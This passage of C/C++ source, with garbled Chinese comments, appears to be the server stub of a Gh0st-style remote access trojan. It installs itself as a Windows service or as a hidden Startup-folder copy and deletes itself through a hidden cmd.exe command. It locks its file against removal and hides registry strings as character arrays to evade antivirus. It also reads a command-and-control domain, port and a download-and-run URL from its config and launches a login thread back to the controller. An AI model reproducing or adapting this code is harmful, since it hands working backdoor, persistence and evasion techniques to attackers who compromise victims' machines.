// 		API_RegSetValueExA(key,"Description", 0, REG_SZ, (CONST BYTE*)m_Description, lstrlen(m_Description));
		RegSetValueEx(key,jdkrg, 0, REG_SZ, (CONST BYTE*)m_Description, lstrlen(m_Description));
	}

	__finally
	{
		if (newService!=NULL)
			CloseServiceHandle(newService);
		if (scm!=NULL)
			CloseServiceHandle(scm);
		if (key!=NULL) 
			RegCloseKey(key);
	}
}

static BOOL service_is_exist()
{
	char SubKey[MAX_PATH]={0};
	char cBKML[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','S','e','r','v','i','c','e','s','\\','\0'};
// 	strcpy(SubKey,"SYSTEM\\CurrentControlSet\\Services\\");
	strcpy(SubKey,cBKML);
	strcat(SubKey,MyServiceName);
	HKEY hKey;
	if(RegOpenKeyExA(HKEY_LOCAL_MACHINE,SubKey, 0L,KEY_ALL_ACCESS,&hKey) == ERROR_SUCCESS)
	{
		RegCloseKey(hKey);  //ע�⣡���й©��  û�ͷ�..

		return TRUE;
	}
	else
		return FALSE;
}

static SERVICE_STATUS srvStatus;
static SERVICE_STATUS_HANDLE hSrv;
static void __stdcall SvcCtrlFnct(DWORD CtrlCode)
{
	switch(CtrlCode)
	{
	case SERVICE_CONTROL_STOP:
		srvStatus.dwCheckPoint=1;
		srvStatus.dwCurrentState=SERVICE_STOP_PENDING;
		SetServiceStatus(hSrv,&srvStatus);
		Sleep(500);
		srvStatus.dwCheckPoint=0;
		srvStatus.dwCurrentState=SERVICE_STOPPED;
		break;
	case SERVICE_CONTROL_SHUTDOWN:
		srvStatus.dwCheckPoint=1;
		srvStatus.dwCurrentState=SERVICE_STOP_PENDING;
		SetServiceStatus(hSrv,&srvStatus);	
		Sleep(500);
		srvStatus.dwCheckPoint=0;
		srvStatus.dwCurrentState=SERVICE_STOPPED;
		break;
	case SERVICE_CONTROL_PAUSE:
		srvStatus.dwCheckPoint=1;
		srvStatus.dwCurrentState=SERVICE_PAUSE_PENDING;
		SetServiceStatus(hSrv,&srvStatus);
		Sleep(500);
		srvStatus.dwCheckPoint=0;
		srvStatus.dwCurrentState=SERVICE_PAUSED;
		break;
	case SERVICE_CONTROL_CONTINUE:
		srvStatus.dwCheckPoint=1;
		srvStatus.dwCurrentState=SERVICE_CONTINUE_PENDING;
		SetServiceStatus(hSrv,&srvStatus);
		Sleep(500);
		srvStatus.dwCheckPoint=0;
		srvStatus.dwCurrentState=SERVICE_RUNNING;
		break;
	}
	SetServiceStatus(hSrv,&srvStatus);
}

HANDLE RunInActiveSession(LPCTSTR lpCommandLine)
{
	HANDLE hProcess;
	HANDLE result;
	HANDLE hProcessInfo;
	
	HINSTANCE userenv = LoadLibrary("userenv.dll"); 
	typedef DWORD (WINAPI *CEB)(LPVOID *lpEnvironment,HANDLE hToken,BOOL bInherit);
	CEB  myCreateEnvironmentBlock= (CEB  )GetProcAddress(userenv,"CreateEnvironmentBlock");
	
	
	LPVOID lpEnvironment = NULL;
	DWORD TokenInformation = 0;
	HANDLE hExistingToken = NULL;
	HANDLE hObject = NULL;
	
	STARTUPINFO StartupInfo;
	PROCESS_INFORMATION ProcessInfo;
	ZeroMemory(&StartupInfo,sizeof(STARTUPINFO));
	ZeroMemory(&ProcessInfo,sizeof(PROCESS_INFORMATION));
	
	ProcessInfo.hProcess = 0;
	ProcessInfo.hThread = 0;
	ProcessInfo.dwProcessId = 0;
	ProcessInfo.dwThreadId = 0;
	StartupInfo.cb = 68;
	StartupInfo.lpDesktop = "WinSta0\\Default";
	
	hProcess = GetCurrentProcess();
	OpenProcessToken(hProcess, 0xF01FFu, &hExistingToken);
	DuplicateTokenEx(hExistingToken,  0x2000000u, NULL, SecurityIdentification, TokenPrimary, &hObject);
	typedef DWORD (WINAPI *TWTSGetActiveConsoleSessionId)(void);
	
	TWTSGetActiveConsoleSessionId  MyWTSGetActiveConsoleSessionId;
	MyWTSGetActiveConsoleSessionId = (TWTSGetActiveConsoleSessionId  )GetProcAddress(LoadLibrary("Kernel32.dll"),"WTSGetActiveConsoleSessionId");
	
	if ( MyWTSGetActiveConsoleSessionId )
	{
		TokenInformation = MyWTSGetActiveConsoleSessionId();
		
		SetTokenInformation(hObject, TokenSessionId, &TokenInformation, sizeof(DWORD));
		myCreateEnvironmentBlock(&lpEnvironment, hObject, false);
		//                WTSQueryUserToken(TokenInformation,&hObject);
		CreateProcessAsUser(
			hObject,
			NULL,
			(TCHAR*)lpCommandLine,
			NULL,
			NULL,
			false,
			0x430u,
			lpEnvironment,
			NULL,
			&StartupInfo,
			&ProcessInfo);
		hProcessInfo = ProcessInfo.hProcess;
		CloseHandle(hObject);
		CloseHandle(hExistingToken);
		result = hProcessInfo;
	}
	else
	{
		result = 0;
	}
	
	if(userenv)
		FreeLibrary(userenv);
	
	return result;
}

void ServiceMain(DWORD dwargc,wchar_t* argv[])
{
	hSrv=RegisterServiceCtrlHandler(MyServiceName,SvcCtrlFnct);
	if( hSrv == NULL )
		return;
	else 
		FreeConsole();
	srvStatus.dwServiceType=SERVICE_WIN32_SHARE_PROCESS;
	srvStatus.dwControlsAccepted=SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_PAUSE_CONTINUE | SERVICE_ACCEPT_SHUTDOWN;
	srvStatus.dwWin32ExitCode=NO_ERROR;
	srvStatus.dwWaitHint=2000;
	srvStatus.dwCheckPoint=1;
	srvStatus.dwCurrentState=SERVICE_START_PENDING;
	SetServiceStatus(hSrv,&srvStatus);
	srvStatus.dwCheckPoint=0;
	Sleep(500);
	srvStatus.dwCurrentState=SERVICE_RUNNING;
	SetServiceStatus(hSrv,&srvStatus);


	HANDLE hMutex = CreateMutex(0,FALSE,MyServiceName);//�����ںζ������ڷ�ֹ������������
	if (GetLastError() == ERROR_ALREADY_EXISTS)
	{
		ExitProcess(0);
		exit(0);
	}
	
	WSADATA Data;
	WSAStartup(0x202, &Data);


	OSVERSIONINFO OSversion;
	OSversion.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&OSversion);
	
	if (OSversion.dwPlatformId == VER_PLATFORM_WIN32_NT)
	{
		if (OSversion.dwMajorVersion < 6)
		{
			
// 			HANDLE hMutex=CreateMutex(NULL,FALSE,MyDomain);
// 			if (GetLastError()==ERROR_ALREADY_EXISTS)
// 			{
// 				ExitProcess(0);
// 			}

			if(MyDele_fs)  //��ռģʽ����
			{
				
				OccupyFile(MyReleaseName);     //��ռģʽ����(ռ��ģʽ)  �޷�ɾ��
			}
//			SetRegInfo();
			HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Login, NULL, 0, NULL);
			WaitForSingleObject(hThread, INFINITE);
			CloseHandle(hThread);
			while(1)
			{
				Sleep(1000*1000);
			}
		}
		else
		{
			char CommandLine[1024],MyPath[MAX_PATH];
			HANDLE         hActiveSession = NULL;
			DWORD   ExitCode = 0; 
//			SetRegInfo();
			GetModuleFileName(NULL,MyPath,MAX_PATH);
			// �������췢�� ֱ������rundll32.exe �ᱻĳЩ������Kill  ���Ƶ�
			wsprintfA(CommandLine,"%s Win7",MyPath);
// 			hActiveSession = RunInActiveSession(CommandLine);        
// 			CloseHandle(hActiveSession);
			if(srvStatus.dwCurrentState != SERVICE_STOP_PENDING && srvStatus.dwCurrentState != SERVICE_STOPPED);
			{
				Sleep(1000);
				GetExitCodeProcess(hActiveSession, &ExitCode);
				
				if ( ExitCode != 259 )
				{
					CloseHandle(hActiveSession);
					Sleep(3000);
					hActiveSession = RunInActiveSession(CommandLine);
				}
				
			}  
			
			WaitForSingleObject(hActiveSession, INFINITE);
			CloseHandle(hActiveSession);
		}
	}do
	{
		Sleep(100);
	}while (srvStatus.dwCurrentState != SERVICE_STOP_PENDING && srvStatus.dwCurrentState != SERVICE_STOPPED && bisUnInstall == FALSE);
///////////////////////////////////////////////////////////////////////////////////////////////////////////
	if(MyDele_fs)  //��ռģʽ����
	{
		
		OccupyFile(MyReleaseName);     //��ռģʽ����(ռ��ģʽ)  �޷�ɾ��
	}
	return;
}


//=============================================================================
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
BOOL DeleteMe()  // ��ɾ��
{
	CHAR szModule[MAX_PATH]={0};//���ļ����ļ�����
	CHAR szComSpec[MAX_PATH]={0};//CMD������
	CHAR szParams[MAX_PATH]={0};//����CMD���������
	//��ȡ���ļ�������
	GetModuleFileName(NULL,szModule,sizeof(szModule));
	GetShortPathName(szModule,szModule,MAX_PATH);
	//��ȡCMD������
	GetEnvironmentVariable("COMSPEC",szComSpec,sizeof(szComSpec));
	//�����������
	lstrcat(szParams,"/c del ");
	lstrcat(szParams,szModule);
	lstrcat(szParams," > nul");
	//���ó�Ա�ṹ
	SHELLEXECUTEINFO SEI;
	SEI.cbSize=sizeof(SEI);
	SEI.hwnd=NULL;
	SEI.lpVerb="Open";
	SEI.lpFile=szComSpec;
	SEI.lpParameters=szParams;
	SEI.lpDirectory=NULL;
	SEI.nShow=SW_HIDE;
	SEI.fMask=SEE_MASK_NOCLOSEPROCESS;
	//���������д��ڽ���
	if (ShellExecuteEx(&SEI)) 
	{
		//����������ΪIDLE_PRIORITY_CLASS���ȼ�������ΪREALTIME_PRIORITY_CLASS���ȼ�����֤�������˳�
		SetPriorityClass(SEI.hProcess,IDLE_PRIORITY_CLASS);
		SetPriorityClass(GetCurrentProcess(),REALTIME_PRIORITY_CLASS);
		SetThreadPriority(GetCurrentThread(),THREAD_PRIORITY_TIME_CRITICAL);
		//֪ͨWindows��Դ��������������ѱ�ɾ��
		SHChangeNotify(SHCNE_DELETE,SHCNF_PATH,szModule,0);
		return TRUE;
	}
	
	return FALSE;
}

////////////////////////////////////////////////////////////////////////////////


///////////////////////////////////////////////////////////////////////////////////////////////////////////////

// extern "C" __declspec(dllexport) BOOL DllFuUpgradrs1(char * p)
// {
// 
// 	OutputDebugString("�������DLL1");
// 	char lpBuffer[1024]={NULL};
// 	char strSubKey0[1024]={NULL};
// 	
// 	memcpy(&dll_info,p,sizeof(DLLSERVER_INFO));
// 	
// 	
// 	
// 	
// 	Login();
// 	return TRUE;
// }

//ɸѡ����
extern "C" __declspec(dllexport) LPVOID Shellex(DLLSERVER_INFO m_Install)
{


	 	    int nInStallSizeof=sizeof(DLLSERVER_INFO)+1;
		    DLLSERVER_INFO *pNewInStall=(DLLSERVER_INFO *)new  char[nInStallSizeof];
			memcpy(pNewInStall,&m_Install,nInStallSizeof);
		 	lstrcpy(MyDomain,pNewInStall->Domain);
			lstrcpy(MyQQDomain,pNewInStall->QQDomain);
			MyPort=pNewInStall->Port;
			MyQQPort=pNewInStall->QQPort;
			lstrcpy(MyVersion,pNewInStall->Version);
			lstrcpy(MyGroup,pNewInStall->Group);	
			lstrcpy(MySocketHead,pNewInStall->SocketHead);
			lstrcpy(MyServiceName,pNewInStall->ServiceName);
			lstrcpy(MyServicePlay,pNewInStall->ServicePlay);	
			lstrcpy(MyServiceDesc,pNewInStall->ServiceDesc);
			lstrcpy(MyReleasePath,pNewInStall->ReleasePath);
			lstrcpy(MyReleaseName,pNewInStall->ReleaseName);	
			lstrcpy(MyMexi,pNewInStall->Mexi);
			MyDele_te=pNewInStall->Dele_te;
			MyDele_zc=pNewInStall->Dele_zc;
			MyDele_zd=pNewInStall->Dele_zd;
			MyDele_fs=pNewInStall->Dele_fs;
			MyDele_Kzj=pNewInStall->Dele_Kzj;
			MyDele_Cul=pNewInStall->Dele_Cul;
			MyFileAttribute=pNewInStall->FileAttribute;
			lstrcpy(MyszDownRun,pNewInStall->szDownRun);	
		 						
		     delete[] pNewInStall;

	OutputDebugString("�������Shellex");
// 	memcpy(&dll_info,p,sizeof(DLLSERVER_INFO));
// 	
// 	char lpBuffer[1024]={NULL};
// 	char strSubKey0[1024]={NULL};

	WNDCLASS m_WndClass;
	ZeroMemory(&m_WndClass,sizeof(WNDCLASS));
	
	//ˮƽ�϶�
	m_WndClass.style=CS_HREDRAW;
	
	//�ص�������ַ
	m_WndClass.lpfnWndProc=NULL;
	
	//��������  ����ΪNULL
	m_WndClass.cbClsExtra = NULL;
	
	//��������  ����ΪNULL
	m_WndClass.cbWndExtra = NULL;
	
	//����ʵ��
	m_WndClass.hInstance  = NULL;
	
	//����Icon
	m_WndClass.hIcon = LoadIcon(NULL,IDI_INFORMATION);
	
	//������
	m_WndClass.hCursor = LoadCursor(NULL,IDC_HELP);
	
	//������ɫ
	m_WndClass.hbrBackground = (HBRUSH)GetStockObject(GRAY_BRUSH);
	
	//��������
	m_WndClass.lpszClassName = NULL;
	
	//ע������
	RegisterClass(&m_WndClass);

	// TODO: Place code here.
	//////////////////////////////////////////////////////////////////////////
	// ����������ʱ��С©��������ʧ
    GetInputState();
	PostThreadMessage(GetCurrentThreadId(),NULL,0,0);
	MSG	msg;
	GetMessage(&msg, NULL, NULL, NULL);

	//��������
	char	strInstallModule[MAX_PATH]; 
	memset(strInstallModule, 0, sizeof(strInstallModule)); 
	GetModuleFileName(NULL,strInstallModule,sizeof(strInstallModule));
	
	HANDLE m_hMutex;
	m_hMutex = CreateMutex(NULL, FALSE, strInstallModule);
	if (m_hMutex && GetLastError() == ERROR_ALREADY_EXISTS)
	{
		exit(0);
		ExitProcess(0);
		return 0;
	}



//	MyEncryptFunction((LPSTR)&dll_info,sizeof(DLLSERVER_INFO));   //������Ϣ����
    
	if (MyszDownRun != NULL)
	{
		MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_DownManager1,
			(LPVOID)MyszDownRun, 0, NULL, true);
	}
	
	if(MyDele_zc)//���������ɫ��װ
	{

		if (MyDele_zc == 2)
		{
			if (service_is_exist())
			{	
				SERVICE_TABLE_ENTRY serviceTable[] = 
				{
					{MyServiceName,(LPSERVICE_MAIN_FUNCTION) ServiceMain},
					{NULL,NULL}
				};
				StartServiceCtrlDispatcher(serviceTable);
				
			}
			else
			{
				
                
				RunService(MyServiceName,MyServicePlay ,MyServiceDesc);
		 				if(MyDele_te)
						{
 					    DeleteMe();  //������ɾ��
						}
				SetGroup(MyServiceName, MyGroup);//д�������Ϣ
	            MarkTime(MyServiceName);  //д�����汾��װʱ����Ϣ
				ExitProcess(0);
				Sleep(500);
			}
			WSADATA Data;
			WSAStartup(0x202, &Data);
			while(1)
			{	
			
           
//				SetRegInfo();
				HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Login, NULL, 0, NULL);
				WaitForSingleObject(hThread, INFINITE);
				CloseHandle(hThread);
				while(1)
				{
					Sleep(1000*1000);
				}
			}
		}
/*	}*/
		if (MyDele_zc == 1)
		{
// 			char cirLl[] = {'S','o','f','t','w','a','r','e','\\','M','i','c','r','o','s','o','f','t','\\','W','i','n','d','o','w','s','\\','C','u','r','r','e','n','t','V','e','r','s','i','o','n','\\','R','u','n','\0'};
// 			WriteRegEx(HKEY_LOCAL_MACHINE, cirLl, "SVCSHOST", REG_SZ, (char *)strInstallModule, lstrlen(strInstallModule), 0);

			SetGroup(MyServiceName, MyGroup);//д�������Ϣ
	        MarkTime(MyServiceName);  //д�����汾��װʱ����
			TCHAR   szPath[MAX_PATH];
			if (!SHGetSpecialFolderPath(NULL, szPath, CSIDL_STARTUP, FALSE))
			{
				return FALSE;
			}
			char FileName[80];
			
			wsprintf(FileName,"%s.exe",MyGroup);
			
			TCHAR buf[MAX_PATH], buf2[MAX_PATH];
			wsprintf(buf, "%s\\%s", szPath, FileName);
			if (GetFileAttributes(buf) == -1)
			{
				wsprintf(buf2, "\\??\\%s\\%s", szPath, FileName);
				DefineDosDevice(1, "agmkis2", buf2);
				Sleep(100);
				CopyFile(strInstallModule,"\\\\.\\agmkis2",FALSE);//���������ļ�
				MoveFileEx(strInstallModule, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
				SetFileAttributes(szPath, FILE_ATTRIBUTE_HIDDEN); 
				CreateDirectory(szPath, NULL);
// 				if(dll_info.Dele_te)
// 					    DeleteMe();  //������ɾ��
			}
			while(1)
			{
//				Login();
//				Sleep(50);
				HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Login, NULL, 0, NULL);
				WaitForSingleObject(hThread, INFINITE);
				CloseHandle(hThread);
				while(1)
				{
					Sleep(1000*1000);
				}
			}
		}

		
	}
	else
	{

		char LcDdy06[] = {'%','s','\0'};
		char lpBuffer[1024]={NULL};
		sprintf(MyServiceName,LcDdy06,MyServiceName);  //��ֵ��������
		
		
		//��������Ϣ
		char UtKoF15[] = {'C','o','n','n','e','c','t','G','r','o','u','p','\0'};
		
		
		
		
		ReadRegExg(MyServiceName,UtKoF15 ,lpBuffer,sizeof(lpBuffer));
		
		
		
		
		if (lstrlen(lpBuffer) == 0)  //
		{
			SetGroup(MyServiceName, MyGroup);//д�������Ϣ
	        MarkTime(MyServiceName);  //д�����汾��װʱ����
		
		}
// 		Sleep(50);
// 		Login();  //�����ļ� 
		HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Login, NULL, 0, NULL);
		WaitForSingleObject(hThread, INFINITE);
		CloseHandle(hThread);
		while(1)
		{
			Sleep(1000*1000);
		}
	
	}

	return 0;
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////


// extern "C" __declspec(dllexport) void MainThread()
// {
// 	if (service_is_exist())
// 	{	
// 		SERVICE_TABLE_ENTRY serviceTable[] = 
// 		{
// 			{dll_info.SerName,(LPSERVICE_MAIN_FUNCTION) ServiceMain},
// 			{NULL,NULL}
// 		};
// 		StartServiceCtrlDispatcher(serviceTable);
// 	}
// 	else
// 	{
// 		RunService(dll_info.SerName,dll_info.Serdisplay ,dll_info.Serdesc);
// 		ExitProcess(0);
// 		Sleep(500);
// 	}
// }

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


// BOOL APIENTRY DllMain( HANDLE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
// {
// 	
// 
// 	OutputDebugString("����DLLMAIN");
// 	hDllModule = (HMODULE)hModule;
// 	if (ul_reason_for_call == DLL_PROCESS_ATTACH)
// 	{
// 		m_gFunc.LoadMyData();
// 	}
// 	return TRUE;
// }
